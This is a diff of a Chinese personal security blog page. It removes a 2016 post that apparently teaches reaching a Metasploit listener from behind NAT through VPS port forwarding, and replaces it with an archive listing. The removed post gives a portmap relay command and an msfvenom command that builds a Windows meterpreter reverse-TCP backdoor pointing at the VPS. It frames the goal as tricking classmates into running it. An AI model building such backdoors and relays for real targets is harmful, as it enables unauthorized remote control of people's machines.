@@ -6,26 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="www.xnianq.cn">
-  <title>内网msf连接外网机器 | xnianq&#39;blog</title>
+  <title>Archives | xnianq&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言一直想搞一波事情，比如在班群里面甩一条免杀木马～但是前提是不在同一内网的机器不能使用metasploit，所以就一直在寻找外网连接内网metasploit的方法。找到的方法大概就是这么几种：  本机有独立ip。但是这个方法很容易被查水表的。 VPS上装MSF直接到MSF上面。但是VPS我的在国外，而且很卡， 通过在VPS上进行端口转发，本地实现突破内网限制。（这一种我认为最好）">
-<meta name="keywords" content="pentest">
-<meta property="og:type" content="article">
-<meta property="og:title" content="内网msf连接外网机器">
-<meta property="og:url" content="www.xnianq.cn/2016/10/29/内网msf连接外网机器/index.html">
+  <meta name="description" content="More Code,less talk!">
+<meta property="og:type" content="website">
+<meta property="og:title" content="xnianq&#39;blog">
+<meta property="og:url" content="www.xnianq.cn/archives/page/3/index.html">
 <meta property="og:site_name" content="xnianq&#39;blog">
-<meta property="og:description" content="前言一直想搞一波事情，比如在班群里面甩一条免杀木马～但是前提是不在同一内网的机器不能使用metasploit，所以就一直在寻找外网连接内网metasploit的方法。找到的方法大概就是这么几种：  本机有独立ip。但是这个方法很容易被查水表的。 VPS上装MSF直接到MSF上面。但是VPS我的在国外，而且很卡， 通过在VPS上进行端口转发，本地实现突破内网限制。（这一种我认为最好）">
-<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/d.png">
-<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/armitage1.jpg">
-<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/link1.jpg">
-<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/msfvenom1.jpg">
-<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/exe.png">
-<meta property="og:image" content="http://ofutja06x.bkt.clouddn.com/attack.jpg">
-<meta property="og:updated_time" content="2017-07-27T07:59:12.000Z">
+<meta property="og:description" content="More Code,less talk!">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="内网msf连接外网机器">
-<meta name="twitter:description" content="前言一直想搞一波事情，比如在班群里面甩一条免杀木马～但是前提是不在同一内网的机器不能使用metasploit，所以就一直在寻找外网连接内网metasploit的方法。找到的方法大概就是这么几种：  本机有独立ip。但是这个方法很容易被查水表的。 VPS上装MSF直接到MSF上面。但是VPS我的在国外，而且很卡， 通过在VPS上进行端口转发，本地实现突破内网限制。（这一种我认为最好）">
-<meta name="twitter:image" content="http://ofutja06x.bkt.clouddn.com/d.png">
+<meta name="twitter:title" content="xnianq&#39;blog">
+<meta name="twitter:description" content="More Code,less talk!">
   
     <link rel="alternative" href="/atom.xml" title="xnianq&#39;blog" type="application/atom+xml">
   
@@ -161,204 +152,52 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="title-内网msf连接外网机器" class="article article-type-title " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      内网msf连接外网机器
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2016" class="archive-year">2016</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2016/08/04/Hello-the-word/" class="archive-article-date">
+  	<time datetime="2016-08-04T13:20:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-04</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2016/08/04/Hello-the-word/">Hello the word</a>
     </h1>
   
 
-        
-        <a href="/2016/10/29/内网msf连接外网机器/" class="archive-article-date">
-  	<time datetime="2016-10-29T14:01:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-10-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直想搞一波事情，比如在班群里面甩一条免杀木马～但是前提是不在同一内网的机器不能使用metasploit，所以就一直在寻找外网连接内网metasploit的方法。找到的方法大概就是这么几种：</p>
-<ul>
-<li>本机有独立ip。但是这个方法很容易被查水表的。</li>
-<li>VPS上装MSF直接到MSF上面。但是VPS我的在国外，而且很卡，</li>
-<li>通过在VPS上进行端口转发，本地实现突破内网限制。（这一种我认为最好）<a id="more"></a>
-</li>
-</ul>
-<p><strong>测试工具</strong>：</p>
-<ul>
-<li>lcx 端口转发工具</li>
-<li>msf，msfvenom，armitage  –metasploit攻击工具</li>
-<li>VPS  公网环境下用于lcx端口转发</li>
-<li>被攻击机器</li>
-</ul>
-<h1 id="0x01-在VPS上面进行端口转发"><a href="#0x01-在VPS上面进行端口转发" class="headerlink" title="0x01 在VPS上面进行端口转发"></a>0x01 在VPS上面进行端口转发</h1><blockquote>
-<p>在一般渗透过程中，由于内网远程连接限制，相信大家都用过lcx进行端口转发。这里也是同理。</p>
-</blockquote>
-<p>端口转发有好多方式，我这里用了最简单的一种了。：）<br>大概思路很很简单，大概思路就是：<br><strong>在vps上面进行端口转发(我在这里用的是lcx的linux版本，portmap)<br><img src="http://ofutja06x.bkt.clouddn.com/d.png" alt="forward"><br><code>./portmap -m 2 -p1 6666 -p2 8888</code><br>这里的意思就是将访问8888端口数据转发到6666端口。那么就可以让后门访问VPS的8888端口，然后本地连接VPS的6666端口，然后达到连接的目的。</strong></p>
-<h1 id="0x02-本地连接vps6666端口"><a href="#0x02-本地连接vps6666端口" class="headerlink" title="0x02 本地连接vps6666端口"></a>0x02 本地连接vps6666端口</h1><p>这里用metasploit图形化界面工具，armitage(kali里面已经集成)。直接打开，然后默认选项进去就行。下一步就是连接VPS了，选择：<strong>armitage-&gt;listeners-&gt;bind</strong><br><img src="http://ofutja06x.bkt.clouddn.com/armitage1.jpg" alt="armitage"><br>在这里，HOST写你的VPS的IP，PORT写6666,shell类型选择meterpreter，可以看到，已经连接上去。<br><img src="http://ofutja06x.bkt.clouddn.com/link1.jpg" alt="link"></p>
-<h1 id="0x03-生成后门，靶机测试。"><a href="#0x03-生成后门，靶机测试。" class="headerlink" title="0x03 生成后门，靶机测试。"></a>0x03 生成后门，靶机测试。</h1><p>免杀用Veil，这里就不用了，简单测试一下，就用msfvenom。命令如下：<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=8888 -f exe &gt; /home/xnianq/test.exe</code><br><img src="http://ofutja06x.bkt.clouddn.com/msfvenom1.jpg" alt="msf"><br>这样已经生成了一个后门，LPORT就是8888端口。<br><img src="http://ofutja06x.bkt.clouddn.com/exe.png" alt="exe"><br>下面就是让被攻击者打开后门，然后得到他的系统权限。<br><img src="http://ofutja06x.bkt.clouddn.com/attack.jpg" alt="attack"><br>这已经拿到了他的系统权限，so，你就可以为所欲为了～ ：）<br>大牛尽情喷～欢迎找我喷～<br>QQ：85903963<br><strong><em>转载请注明出处。</em></strong></p>
-<hr>
-<p>本文出自”xnianq Blog”：www.xnianq.cn/2016/10/29/内网msf连接外网机器/</p>
+        <div class="article-info info-on-right">
+          
+          
 
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="http://ofutja06x.bkt.clouddn.com/zfb.png">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="http://ofutja06x.bkt.clouddn.com/wx.png">
-                      <span class="reward-type">微信</span>
-                    </div>
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
         </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">pentest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
-        </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http:www.xnianq.cn/2016/10/29/内网msf连接外网机器/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2016/12/20/google-hacking/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          google-hacking
-        
-      </div>
-    </a>
   
   
-    <a href="/2016/09/30/一些拿站的思路/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">JBoss的思路</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
+    
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/archives/page/2/">&laquo; Prev</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span>
+    </nav>
   
 
 
@@ -382,8 +221,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
